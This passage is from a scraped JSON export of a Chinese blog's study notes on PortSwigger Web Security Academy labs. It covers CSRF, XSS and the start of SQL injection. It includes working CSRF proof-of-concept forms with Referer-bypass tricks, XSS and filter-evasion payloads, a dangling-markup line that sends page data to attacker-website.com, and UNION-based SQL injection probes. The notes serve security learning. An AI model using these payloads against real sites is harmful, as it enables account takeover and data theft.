\u0026#34;https://0ada003e03bafa27810c1176007b00da.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 注意，为了保证参数的独立、有效性，需要对 \u0026amp; 进行 URL 编码。后面的 submit 是附带的。将原本的 post 请求改为了等价的 get 请求。\n子域名 + WebSocket 要先学一下 websocket…… 跳了\nReferrer 绕过 检测遗漏 1.攻击点：抓更改邮箱的包\n2.测试：没有明显的限制，但是发现了有 Referer，更改了以后请求不被接受，删除了以后可以正常发包，绕过了。\n3.攻击：添加 meta 标签即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;meta name=\u0026#34;referrer\u0026#34; content=\u0026#34;never\u0026#34;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0ac000720470f4dc803b1c4600a90089.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;123\u0026amp;#64;qq\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;); document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 检测简陋 1.攻击点：抓更新邮箱的包，发现 Referer，更改内容后无法过检测，但是在前面添加时可以的，推测只要存在原有域名就可以了。找到绕过点。\n2.测试：了解到js方法 history.pushState(\u0026quot;\u0026quot;, \u0026quot;\u0026quot;, \u0026quot;/?0a0f00e8043675cc805ec1b20058002d.web-security-academy.net\u0026quot;)，HTML5 的 History API，用于修改浏览器地址栏 URL 而不触发页面刷新；能够用于构造带目标域名的查询字符串，进而控制 Referer 头内容。但是这样还是会被检测出来，需要再在请求头中添加 Referrer-Policy: unsafe-url，否则浏览器会自动剥离 Referer 中的查询字符串。\n注意 Referrer-Policy 拼写是正确的\n3.攻击：更改 js 代码，添加 history api。更改服务器的 Head。发包即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://0a0f00e8043675cc805ec1b20058002d.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;123654\u0026amp;#64;qq\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit request\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; history.pushState(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;/?0a0f00e8043675cc805ec1b20058002d.web-security-academy.net\u0026#34;); document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2025-11-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-csrf%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/","title":"Burp靶场：CSRF 跨站请求伪造"},{"content":"知识 XSS速查表\n原理 XSS（Cross-site scripting）就是网站的一个安全漏洞——攻击者能利用这个漏洞，搞乱用户和网站的正常交互。\n浏览器原本禁止不同网站之间随便访问对方的数据（比如打开淘宝，淘宝不能直接读取你微信的数据），这就是同源策略。但XSS能绕开这个规则。\n一旦网站有XSS漏洞，攻击者就能伪装成受害用户，干用户能做的所有事（比如发消息、转账），还能看用户的所有数据（比如个人信息、登录凭证）。如果这个用户是网站管理员（有最高权限），攻击者甚至能完全控制整个网站。\n工作机制很简单：攻击者让有漏洞的网站，给用户返回一段恶意的JavaScript代码。等用户打开网站，这段代码就在用户的浏览器里自动执行了——这时候，用户和网站的交互就被攻击者完全操控了。\nXSS 攻击主要分 3 种：\n反射型 XSS：恶意代码藏在当前的 HTTP 请求里（比如搜索框输入、URL 参数里），网站没处理就直接返回，浏览器一执行就中招。 存储型 XSS：恶意代码会被网站存到数据库里（比如评论区、个人资料页），只要有人打开包含这段代码的页面，就会自动执行 —— 相当于把恶意代码留在网站上，谁来谁中招。 DOM 型 XSS：这个漏洞不在网站服务器的代码里，而是在你浏览器端的代码（比如网页里的 JavaScript）里，是客户端自己处理数据时出的问题。 验证XSS漏洞（PoC） 想知道一个网站有没有XSS漏洞，最直接的办法就是“注入测试代码”：往网站的输入框（比如评论区、搜索框）里填一段JavaScript代码，看能不能让浏览器执行。\n以前大家都用alert()函数做测试——这函数特别好用：代码就几个字、没危险，而且一旦执行成功，浏览器会弹出一个提示框，一眼就能看出来漏洞存在。大部分情况只要让模拟用户的浏览器弹出这个提示框，就算验证成功了。\n不过有个小坑：用Chrome浏览器的话，从92版本（2021年7月更新）开始，跨网站的iframe里不能用alert()了。有些复杂的XSS攻击需要用到这种iframe，这时候就换个测试代码——用print()函数就行（执行后会弹出打印页面，同样能验证漏洞）。\n反射型 应用程序从HTTP请求中接收数据后，未经过安全处理便将其直接嵌入即时响应内容中，导致恶意脚本被浏览器执行。其核心特征是恶意代码通过请求“反射”至响应结果，仅在单次请求-响应周期中生效，不涉及数据存储。\n示例 假设某网站的搜索功能通过URL参数接收用户输入的关键词，例如用户搜索“gift”时，请求URL如下：\n1 https://insecure-website.com/search?term=gift 应用程序收到请求后，会将参数term的值直接回显到响应页面中，返回的HTML内容为：\n1 \u0026lt;p\u0026gt;您搜索的关键词：gift\u0026lt;/p\u0026gt; 此时数据仅作为正常文本展示，无安全风险。\n当应用程序未对请求参数进行过滤、转义等安全处理时，攻击者可构造包含恶意JavaScript代码的URL：\n1 https://insecure-website.com/search?term=\u0026lt;script\u0026gt;/* 恶意代码逻辑 */\u0026lt;/script\u0026gt; 应用程序依然直接回显参数内容，导致响应中包含恶意脚本：\n1 \u0026lt;p\u0026gt;您搜索的关键词：\u0026lt;script\u0026gt;/* 恶意代码逻辑 */\u0026lt;/script\u0026gt;\u0026lt;/p\u0026gt; 当受害者点击该恶意URL时，恶意脚本会在其浏览器中执行，且执行上下文与受害者的应用程序会话相关联——攻击者可借此获取用户会话凭证、篡改页面内容等。\n影响 若攻击者能够控制在受害用户浏览器中执行的脚本，通常可完全攻陷该用户的账户与交互环境。具体而言，攻击者可实现以下操作：\n执行受害用户在应用内有权限完成的任意操作； 查看受害用户可访问的所有信息； 修改受害用户有权限更改的各类数据； 以受害用户的身份与应用内其他用户发起交互（包括实施恶意攻击），且此类操作会显示为受害用户本人所为。 攻击者需通过外部传播渠道诱导受害用户发起受控请求，方可成功实施反射型 XSS 攻击。常见传播手段包括：\n在自身控制的网站或支持用户生成内容的第三方平台上植入恶意链接； 通过电子邮件、推特（Twitter）或其他即时通讯工具向目标用户发送恶意链接。 攻击方式 反射型XSS存在多种具体表现形式，其漏洞利用所需的攻击载荷（Payload）类型及漏洞影响范围，主要取决于以下两个核心因素：\n反射数据在响应中的位置 应用程序将用户输入数据反射至响应内容时，会嵌入不同的上下文场景（如HTML标签内、标签属性中、JavaScript代码块里等），不同位置对攻击载荷的格式要求截然不同。\n示例1：数据嵌入HTML标签文本中（如\u0026lt;p\u0026gt;用户输入\u0026lt;/p\u0026gt;），通常需使用\u0026lt;script\u0026gt;等标签构造恶意脚本； 示例2：数据嵌入HTML标签属性中（如\u0026lt;img src=\u0026quot;用户输入\u0026quot;\u0026gt;），可能需要先闭合属性引号（如\u0026quot;onload=恶意代码\u0026quot;）再注入脚本； 示例3：数据嵌入JavaScript代码中（如var x = \u0026quot;用户输入\u0026quot;），需先闭合字符串或代码块（如\u0026quot;; 恶意代码; //）才能让脚本执行。 应用程序对提交数据的预处理 若应用程序在反射数据前，对用户输入执行了验证、过滤或编码等处理（如过滤\u0026lt;script\u0026gt;标签、将特殊字符转义为HTML实体等），则需针对性调整攻击载荷：\n若过滤了\u0026lt;script\u0026gt;标签，可改用\u0026lt;img onload\u0026gt;、\u0026lt;svg onload\u0026gt;等不含被过滤关键词的事件驱动型脚本； 若对\u0026lt;、\u0026gt;等字符进行了HTML编码，可尝试在JavaScript上下文或属性上下文等未编码的场景中注入，或利用编码绕过技巧（如大小写混淆、特殊字符替换）。 漏洞发现 绝大多数反射型XSS漏洞可通过Burp Suite的Web漏洞扫描器快速、可靠地检测到。以下是手动测试反射型XSS漏洞的完整步骤，结合实战场景拆解操作逻辑：\n一、覆盖所有输入入口\n需逐一测试应用程序HTTP请求中所有可能传入数据的入口，确保无遗漏：\n核心输入点：URL查询字符串（如?id=123）、POST请求体（表单数据）、URL路径（如/user/[输入值]）； 可选测试点：HTTP请求头（如Referer、User-Agent、Cookie等）—— 需注意：部分仅能通过特定请求头触发的XSS类行为，实际可能无法利用（因浏览器对请求头的输入限制或同源策略约束）。 二、提交随机字母数字值，验证数据是否反射\n构造测试值：为每个输入入口提交一个唯一的随机字母数字值（如x7z9p2q5）。要求：\n仅含字母数字（避免触发输入验证拦截）； 长度约8字符（既简短易通过验证，又能降低响应中偶然匹配的概率）； 工具辅助高效测试：\n用Burp Intruder的“随机生成十六进制值”功能生成测试值； 开启Burp Intruder的“Grep Payloads”设置，自动标记包含提交值的响应（快速筛选出存在反射的入口）； 核心目的：确认提交的随机值是否原封不动（或仅轻微修改）出现在响应内容中—— 存在反射是触发XSS的前提。\n三、确定反射上下文\n针对响应中随机值出现的每个位置，分析其嵌入上下文（不同上下文需对应不同攻击载荷），常见场景包括：\nHTML标签间文本：如\u0026lt;p\u0026gt;随机值\u0026lt;/p\u0026gt;（直接嵌入标签内容）； 带引号的标签属性：如\u0026lt;input value=\u0026quot;随机值\u0026quot;\u0026gt;（可能是单引号、双引号或无引号包裹）； JavaScript代码中：如var data = \u0026quot;随机值\u0026quot;;（嵌入脚本字符串、注释或代码块）； CSS样式中：如\u0026lt;style\u0026gt;body{color:随机值;}\u0026lt;/style\u0026gt;（较少见，但需注意上下文约束）。 四、测试候选 Payload\n根据反射上下文，设计能触发JavaScript执行的初始候选载荷，操作步骤：\n将请求发送到Burp Repeater（右键请求 → Send to Repeater）； 保留原始随机值（作为定位标记），在其前后插入候选载荷（如在x7z9p2q5前添加\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;）； 在Burp Repeater的响应视图中，搜索原始随机值—— Burp会高亮所有反射位置，便于快速查看载荷是否被原样保留； 核心判断：若载荷未被修改且符合上下文语法（如标签闭合正确、引号匹配），则可能触发XSS。 五、测试替代载荷（应对输入过滤/修改）\n若候选载荷被应用程序过滤（如移除\u0026lt;script\u0026gt;标签）、编码（如将\u0026lt;转义为\u0026amp;lt;）或拦截，则需根据反射上下文和输入验证规则，调整载荷策略：\n上下文适配：如HTML属性中用\u0026quot;onload=alert(1)x=\u0026quot;（闭合属性引号+事件触发），JavaScript中用\u0026quot;;alert(1);//（闭合字符串+注释后续代码）； 绕过过滤：如大小写混淆（\u0026lt;Script\u0026gt;alert(1)\u0026lt;/Script\u0026gt;）、标签替换（\u0026lt;img src=x onerror=alert(1)\u0026gt;替代\u0026lt;script\u0026gt;）、特殊字符编码（如URL编码、Unicode编码）； 参考：可结合“跨站脚本攻击上下文”相关知识，针对性设计载荷。 六、在浏览器中验证攻击效果\n若在Burp Repeater中确认载荷有效，需在真实浏览器中验证（避免工具环境与实际浏览器的差异导致误判）：\n触发方式： URL参数注入：直接将含载荷的URL粘贴到浏览器地址栏； POST请求/请求头注入：用Burp Proxy拦截请求，修改参数后放行，观察浏览器行为； 验证脚本：推荐执行简单可见的JavaScript（如alert(document.domain)），若浏览器弹出包含当前域名的提示框，则说明XSS漏洞已成功利用。 存储型 应用程序从不可信来源接收数据后，未经过安全处理便将其纳入后续的 HTTP 响应中，导致恶意脚本被浏览器执行的漏洞类型。其核心特征是恶意数据会被应用程序持久化存储（如存入数据库），而非仅在单次请求 - 响应周期中临时传递。\n示例 假设某网站支持用户对博客文章提交评论，且评论内容会对所有访问该文章的用户展示。用户提交评论时，发送的HTTP请求如下：\n1 2 3 4 5 POST /post/comment HTTP/1.1 Host: vulnerable-website.com Content-Length: 100 postId=3\u0026amp;comment=This+post+was+extremely+helpful.\u0026amp;name=Carlos+Montoya\u0026amp;email=carlos%40normal-user.net 评论提交后，任何访问该博客文章的用户，都会在应用程序的响应中看到该评论内容：\n1 \u0026lt;p\u0026gt;This post was extremely helpful.\u0026lt;/p\u0026gt; 此时数据仅作为正常评论展示，无安全风险。\n若应用程序未对评论内容进行过滤、转义等安全处理，攻击者可提交包含恶意JavaScript代码的评论。在攻击者发送的请求中，恶意评论会被URL编码（避免传输过程中出现解析异常）：\n1 comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E 该恶意评论会被应用程序存储至数据库。当其他用户访问该博客文章时，应用程序会从数据库中读取该评论并嵌入响应内容，返回结果如下：\n1 \u0026lt;p\u0026gt;\u0026lt;script\u0026gt;/* Bad stuff here... */\u0026lt;/script\u0026gt;\u0026lt;/p\u0026gt; 此时，攻击者注入的恶意脚本会在受害用户的浏览器中执行，且执行上下文与受害用户的应用程序会话相关联。\n影响 存储型 XSS 与反射型 XSS 的关键区别在于攻击的自包含性：\n存储型 XSS 的攻击完全依托应用程序自身完成：攻击者只需将恶意脚本注入并存储到应用中（如评论区、数据库），无需依赖外部渠道诱导用户触发（如发送恶意 URL、诱导提交表单），只需等待用户自然访问包含恶意脚本的页面即可。 反射型 XSS 则依赖外部触发：攻击者必须通过邮件、社交平台等外部方式，诱导用户主动发起包含恶意代码的请求，攻击才能生效。 当 XSS 漏洞仅影响已登录用户时，存储型 XSS 的自包含特性会显著提升攻击成功率：\n反射型 XSS 的攻击存在 “时间窗口限制”：若用户点击恶意链接时未登录应用，攻击将无法利用用户会话权限，大概率失效； 存储型 XSS 可完全规避该问题：用户只有在登录状态下才会访问包含恶意脚本的页面（如已登录用户查看评论、个人中心等），一旦访问，恶意脚本会直接在用户的登录会话上下文的中执行，攻击成功率极高。 漏洞发现 一、明确测试范围\n需测试的输入入口（数据进入应用的渠道）\n所有攻击者可注入数据的场景均需覆盖，包括：\n核心输入点：URL 查询字符串、POST 请求体中的参数 / 数据，URL 文件路径（如/profile/[输入值]）； 特殊输入点：部分在反射型 XSS 中难以利用的 HTTP 请求头（存储型场景下可能被持久化，需纳入测试）； 带外输入渠道（取决于应用功能）：攻击者通过非直接交互方式提交数据的路径，例如： 邮件应用：处理收到的邮件内容； 社交动态展示应用：解析第三方平台（如 Twitter）的推文数据； 新闻聚合应用：嵌入其他网站的来源数据。 需测试的输出出口（数据展示的场景）\n所有可能向用户返回数据的 HTTP 响应场景，包括：\n公开页面（如博客评论区、商品评价页）； 私密页面（如用户个人中心、后台管理面板）； 特殊功能页面（如审计日志、历史操作记录、通知列表）。 二、手测\n若逐一测试 “输入 - 输出” 的所有组合（每个输入对应每个输出），在多页面应用中完全不现实。更高效的做法是：\n系统性遍历输入入口：为每个输入点提交一个唯一标识值（如stored_xss_test_123）； 监控应用响应：观察所有后续访问的页面响应，检测该标识值是否出现； 重点关注高风险功能：优先测试评论区、个人资料编辑、动态发布等典型存储场景； 验证数据持久性：若标识值出现在响应中，需确认该数据是 “跨请求存储”（如数据库存储），而非仅在单次请求中反射（避免误判为反射型 XSS）。 三、漏洞验证\n当找到明确的 “输入 - 输出” 对应关系后，需按以下步骤验证存储型 XSS 漏洞，流程与反射型 XSS 测试大致一致：\n确定输出上下文：分析标识值在响应中的嵌入位置（如 HTML 标签间、标签属性、JavaScript 代码块等）； 设计适配载荷：根据上下文场景，构造能触发 JavaScript 执行的候选攻击载荷（如属性上下文用\u0026quot;onerror=alert(1)x=\u0026quot;，JS 上下文用\u0026quot;;alert(1);//）； 提交并验证：将载荷通过输入入口提交（如发布含载荷的评论），访问对应的输出页面，检查载荷是否被原样存储并展示； 绕过输入处理：若载荷被过滤 / 编码，根据应用的输入验证规则（如过滤\u0026lt;script\u0026gt;标签、HTML 编码），调整替代载荷（如事件驱动标签、大小写混淆、编码绕过）； 浏览器确认：最终在真实浏览器中访问输出页面，验证恶意脚本是否实际执行（如用alert(document.domain)触发弹窗）。 DOM型 文档对象模型（DOM）通过将文档的结构（例如表示网页的 HTML）以对象的形式存储在内存中，将网页与脚本或编程语言连接起来。尽管将 HTML、SVG 或 XML 文档建模为对象并不是 JavaScript 核心语言的一部分，但它通常与 JavaScript 相关。\nDOM型跨站脚本攻击（DOM-based XSS）漏洞的核心成因是：JavaScript从攻击者可控制的数据源（如URL）获取数据后，将其传递给支持动态代码执行的数据接收点（Sink）（如eval()函数、innerHTML属性），导致攻击者注入的恶意JavaScript代码被执行，最终通常可实现劫持用户账户等攻击目的。\n漏洞发现 绝大多数DOM型XSS漏洞可通过Burp Suite的Web漏洞扫描器快速、可靠地检测。手动测试需借助带开发者工具的浏览器（如Chrome），按“逐个测试数据源→针对性验证接收点”的逻辑开展。\n一、测试HTML类接收点（如innerHTML、document.write()）\nHTML类接收点的核心特征是：攻击者输入的数据会最终嵌入DOM结构中，测试步骤如下：\n注入标识字符串：将随机字母数字组合（如dom_xss_test_789）注入目标数据源（如URL查询字符串?param=dom_xss_test_789）； 检查DOM中的位置： 注意：浏览器“查看源代码”功能无效（无法显示JavaScript动态修改后的DOM），需打开Chrome开发者工具（F12），在「Elements」面板中按Ctrl+F（Mac为Command+F）搜索标识字符串，定位其在DOM中的具体位置； 分析上下文并测试：根据标识字符串的嵌入上下文，调整输入内容测试是否可突破限制： 若在双引号包裹的属性中（如\u0026lt;input value=\u0026quot;标识字符串\u0026quot;\u0026gt;），尝试注入双引号（\u0026quot;）+ 事件脚本（如\u0026quot;?onclick=alert(1)x=\u0026quot;），测试是否能跳出属性并触发脚本； 若在HTML标签间（如\u0026lt;div\u0026gt;标识字符串\u0026lt;/div\u0026gt;），尝试注入\u0026lt;script\u0026gt;标签或事件驱动标签（如\u0026lt;img src=x onerror=alert(1)\u0026gt;）。 不同浏览器对URL数据源的编码行为不同，直接影响攻击效果：\nChrome、Firefox、Safari：会对location.search（查询字符串）和location.hash（片段标识符）进行URL编码（如\u0026lt;编码为%3C）； IE11、旧版Edge（非Chromium内核）：不会对上述数据源编码； 若注入的数据在被处理前已被URL编码，通常无法触发XSS（编码后的特殊字符无法被浏览器解析为脚本语法）。 二、测试JavaScript执行类接收点（如eval()、setTimeout()）\n此类接收点的核心特征是：攻击者输入的数据会作为JavaScript代码执行，且不一定会嵌入DOM中，测试难度更高，步骤如下：\n定位数据源引用：打开Chrome开发者工具，按Ctrl+Shift+F（Mac为Command+Alt+F），搜索页面所有JavaScript代码中对目标数据源的引用（如搜索location.search、location.hash）； 通过调试跟踪数据流转： 在数据源被读取的代码位置设置断点（点击代码行号左侧）； 刷新页面触发断点，逐步跟踪数据流向：观察数据源的值是否被赋值给其他变量，若有则继续搜索这些变量，直至找到其传递到的危险接收点（如eval(变量名)）； 验证并构造载荷：在断点处悬停变量，查看数据传递到接收点前的原始值；根据接收点的语法规则构造载荷（如eval()接收字符串，可注入\u0026quot;;alert(1);//闭合原有字符串并执行脚本）。 三、使用DOM Invader工具简化测试\n在实际场景中，DOM型XSS的测试往往需要手动分析复杂、压缩后的JavaScript代码，过程繁琐。若使用Burp内置浏览器，可借助其自带的DOM Invader插件，该工具能自动识别数据源与接收点的关联、跟踪数据流转，大幅降低手动测试的工作量。\nDOM Invader - PortSwigger\n漏洞利用 DOM型XSS的漏洞本质是：攻击者可控的数据源（如URL）经客户端JavaScript流转至危险接收点（Sink），且未做安全处理，导致恶意脚本执行。实际利用需适配数据源/接收点特性，绕过页面数据验证逻辑。\n接收点类型 特性与示例载荷 document.write() 支持\u0026lt;script\u0026gt;标签，可直接注入：\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;；需注意闭合现有HTML元素 innerHTML 现代浏览器不支持\u0026lt;script\u0026gt;，需用事件驱动标签：\u0026lt;img src=1 onerror=alert(document.domain)\u0026gt; jQuery（attr()） 若控制href等属性，可注入JS协议：javascript:alert(document.domain) jQuery（$()选择器） 旧版本存在漏洞，可通过hashchange事件注入：#\u0026lt;img src=1 onerror=alert(1)\u0026gt;（需iframe触发） AngularJS 支持双花括号执行JS，无需尖括号/事件：{{alert(document.domain)}}（需网站启用ng-app） 第三方依赖漏洞：jQuery、AngularJS等框架的特定函数（如jQuery的html()、AngularJS的表达式）可能成为接收点； 结合反射/存储机制： 反射型DOM XSS：服务器将URL参数反射到页面，客户端脚本 unsafe 处理后触发； 存储型DOM XSS：服务器存储恶意数据，后续响应中客户端脚本 unsafe 处理该数据。 原生JS接收点\n1 document.write()、document.writeln()、element.innerHTML、element.outerHTML、element.insertAdjacentHTML、element.onevent jQuery接收点\n1 add()、after()、append()、html()、prepend()、replaceWith()、$.parseHTML() 防护措施\n禁止将不可信数据源（如URL、用户输入）动态写入HTML文档； 遵循DOM型漏洞通用防护规则，对数据源进行严格过滤与编码； 及时更新第三方框架（如jQuery、AngularJS），修复已知漏洞。 悬挂标记注入 悬挂标记注入是一种无法实施完整XSS攻击时的跨域数据捕获技术，核心是通过构造“未闭合的HTML标记”，诱使浏览器将页面后续敏感数据作为请求参数发送至攻击者控制的服务器，本质是XSS攻击的替代攻击手段。\n当应用程序将攻击者可控数据不安全地嵌入响应（如未过滤/转义特殊字符），但因输入过滤、内容安全策略（CSP）等限制无法实施常规XSS时，通过注入“未闭合的HTML属性/标签”，迫使浏览器解析后续页面数据并发送至攻击者服务器的攻击方式。\n前提：\n应用程序未过滤/转义\u0026gt;、\u0026quot;、'等关键字符，攻击者可突破属性/标签限制； 常规XSS攻击被阻断（如CSP拦截脚本执行、过滤所有脚本标签/事件）； 页面注入点后续存在敏感数据（如CSRF令牌、邮件内容、财务信息等）。 示例 假设应用响应中存在不安全嵌入的可控数据（未闭合属性/标签）：\n1 \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;input\u0026#34; value=\u0026#34;CONTROLLABLE DATA HERE\u0026lt; 攻击者注入 payload：\u0026quot;\u0026gt;\u0026lt;img src='//attacker-website.com? 第一步：\u0026quot;\u0026gt; 闭合原有value属性和\u0026lt;input\u0026gt;标签，回到HTML自由上下文； 第二步：创建\u0026lt;img\u0026gt;标签并定义src属性，但其src值仅开头（//attacker-website.com?），未闭合单引号，处于“悬挂”状态； 浏览器解析行为：浏览器会自动查找后续第一个单引号以闭合src属性，期间所有内容（从注入点之后到第一个单引号前）都会被当作srcURL的一部分，且非字母数字字符（如换行、尖括号）会被URL编码； 数据捕获：浏览器会向//attacker-website.com?[后续敏感数据]发送请求，攻击者通过服务器日志即可获取编码后的敏感数据。 防护措施 核心防护（与XSS通用）： 输出编码：将用户可控数据嵌入HTML时，对特殊字符（\u0026gt;、\u0026lt;、\u0026quot;、'等）进行HTML实体编码； 输入验证：严格校验输入数据，过滤可能用于突破标签/属性的特殊字符或标记。 辅助防护： 内容安全策略（CSP）：配置限制img、link等标签加载外部资源的策略（可阻断部分攻击，但非全部）； 依赖浏览器防护：Chrome浏览器已针对该攻击优化——禁止img等标签的URL包含尖括号、换行等原始字符，因捕获的敏感数据通常含此类字符，可直接阻断攻击。 CSP 内容安全策略 内容安全策略（CSP）是一种浏览器安全机制，核心目的是缓解XSS、悬挂标记注入、点击劫持等攻击，通过限制页面可加载的资源（如脚本、图片）、是否允许被其他页面嵌套等规则，构建安全的页面运行环境。其核心实现方式是通过HTTP响应头Content-Security-Policy，配置多个用分号分隔的指令（Directive）定义安全规则。\n缓解XSS攻击 核心思路是白名单管控脚本来源，阻止攻击者注入的恶意脚本执行，主要通过script-src指令实现：\n仅允许加载同源脚本：script-src 'self'（'self'表示当前页面所在域名）； 仅允许加载指定域名脚本：script-src https://scripts.normal-website.com； 进阶白名单方式（避免依赖外部域名风险）： 非ces（Nonce）：指令中指定随机生成的非ce值，脚本标签需包含相同nonce属性才允许执行（非ce需每次页面加载随机生成，不可猜测）； 哈希（Hash）：指令中指定可信脚本的内容哈希值，脚本内容哈希与指令匹配才允许执行（脚本内容变更需同步更新哈希值）； 注意事项：允许外部域名（如CDN）脚本时需谨慎，若第三方域名可被攻击者控制内容，仍可能引发攻击。 缓解悬挂标记注入攻击 通过img-src等指令限制可发起外部请求的资源来源，阻断攻击的数据捕获路径：\n仅允许同源图片加载：img-src 'self'； 仅允许指定域名图片加载：img-src https://images.normal-website.com； 局限性：仅能阻断依赖\u0026lt;img\u0026gt;标签的攻击，无法防御\u0026lt;a\u0026gt;标签href属性等其他形式的悬挂标记注入。 防护点击劫持攻击 通过frame-ancestors指令限制页面被嵌套（iframe）的规则，比X-Frame-Options头更灵活：\n仅允许同源页面嵌套：frame-ancestors 'self'； 完全禁止嵌套：frame-ancestors 'none'； 支持多域名/通配符：frame-ancestors 'self' https://normal-website.com https://*.robust-website.com； 优势：可验证父框架层级中所有页面的来源，而X-Frame-Options仅验证顶层框架。 CSP的绕过技巧 利用政策注入绕过 适用场景：网站将攻击者可控的输入（如URL参数）反射到CSP政策中（常见于report-uri指令）； 绕过逻辑：注入分号（;）分割原有指令，添加自定义指令；若report-uri是最后一个指令，需覆盖原有指令（如利用Chrome的script-src-elem指令，可覆盖script-src指令，控制脚本元素执行）。 突破外部请求限制 场景：CSP禁止所有外部请求； 绕过逻辑：诱导用户交互（如点击），注入含未闭合属性的HTML元素（如\u0026lt;a\u0026gt;标签），用户点击后将元素内的页面数据发送至攻击者服务器。 ","date":"2025-11-22T00:00:00Z","permalink":"https://calendar0917.github.io/posts/burp%E9%9D%B6%E5%9C%BA-xss/","title":"Burp靶场：XSS 跨站脚本注入（待完善）"},{"content":"知识 注入点 可以通过对应用程序的所有输入点执行一套系统化测试，手动检测 SQL 注入漏洞。通常需提交以下内容：\n单引号字符 '，观察是否出现错误或其他异常； 特定 SQL 语法（其计算结果分别等于输入点的原始值和不同值），观察应用程序响应是否存在规律性差异； 布尔条件（如 OR 1=1、OR 1=2），观察应用程序响应差异； 用于在 SQL 查询执行时触发延时的负载，观察响应时间是否存在差异； 用于在 SQL 查询执行时触发带外网络交互的 OAST（带外应用安全测试） 负载，并监控是否产生相关交互。 此外，也可以使用 Burp Scanner 快速、可靠地发现绝大多数 SQL 注入漏洞。\nUNION 攻击 当应用程序存在SQL注入漏洞，且查询结果会返回到应用响应中时，可利用 UNION 关键字从数据库的其他表中获取数据。这种攻击方式通常被称为 SQL注入UNION攻击。\nUNION 关键字允许执行一个或多个额外的 SELECT 查询，并将结果附加到原始查询中。例如：\n1 SELECT a, b FROM table1 UNION SELECT c, d FROM table2 该SQL查询会返回一个包含两列的结果集，数据涵盖 table1 表的 a、b 列和 table2 表的 c、d 列。\n要让 UNION 查询生效，必须满足两个关键条件：\n各个查询必须返回相同数量的列； 各个查询对应列的数据类型必须兼容。 实施 SQL 注入 UNION 攻击时，需确保攻击手段符合这两个条件。这通常需要查明以下两点：\n原始查询返回的列数是多少； 原始查询返回的列中，哪些列的数据类型适合承载注入查询的结果。 判断列数 在实施SQL注入UNION攻击时，有两种有效方法可确定原始查询返回的列数。\n其中一种方法是注入一系列ORDER BY子句，并逐步增加指定的列索引，直至触发错误。例如，若注入点位于原始查询WHERE子句内的带引号字符串中，你需要提交以下负载：\n1 2 3 4 \u0026#39; ORDER BY 1-- \u0026#39; ORDER BY 2-- \u0026#39; ORDER BY 3-- …… 这一系列负载会修改原始查询，使其按结果集中的不同列对结果排序。ORDER BY子句中的列可通过索引指定，因此无需知晓任何列名。当指定的列索引超过结果集中的实际列数时，数据库会返回错误，例如：\nORDER BY位置编号3超出了选择列表中的项目数量。\n应用程序可能会在HTTP响应中直接返回数据库错误，也可能返回通用的错误响应，甚至可能仅返回空结果。无论哪种情况，只要能检测到响应中的差异，就能推断出查询返回的列数。\n第二种方法是提交一系列UNION SELECT负载，其中包含数量不同的空值（NULL）：\n1 2 3 4 \u0026#39; UNION SELECT NULL-- \u0026#39; UNION SELECT NULL,NULL-- \u0026#39; UNION SELECT NULL,NULL,NULL-- …… 若空值的数量与列数不匹配，数据库会返回错误。\n我们将注入的SELECT查询的返回值设为NULL，原因是原始查询与注入查询的对应列必须数据类型兼容。而NULL可转换为所有常见的数据类型，因此当列数正确时，能最大程度提高负载的执行成功率。\n寻找数据类型可用的列 SQL注入UNION攻击能让你获取注入查询的结果，而你想要提取的关键数据通常是以字符串形式存储的。这意味着，你需要在原始查询的结果中，找到一列或多列数据类型为字符串，或与字符串数据兼容的列。\n在确定所需的列数后，你可以逐个探测每一列，测试其是否能存储字符串数据。你需要提交一系列UNION SELECT负载，依次在每一列中放入一个字符串值。例如，若查询返回四列，你应提交以下负载：\n1 2 3 4 \u0026#39; UNION SELECT \u0026#39;a\u0026#39;,NULL,NULL,NULL-- \u0026#39; UNION SELECT NULL,\u0026#39;a\u0026#39;,NULL,NULL-- \u0026#39; UNION SELECT NULL,NULL,\u0026#39;a\u0026#39;,NULL-- \u0026#39; UNION SELECT NULL,NULL,NULL,\u0026#39;a\u0026#39;-- 如果目标列的数据类型与字符串不兼容，注入的查询会触发数据库错误。\n若未出现错误，且应用程序的响应中包含了额外内容（其中包含注入的字符串值），则说明该列适合用于提取字符串数据。\n漏洞利用 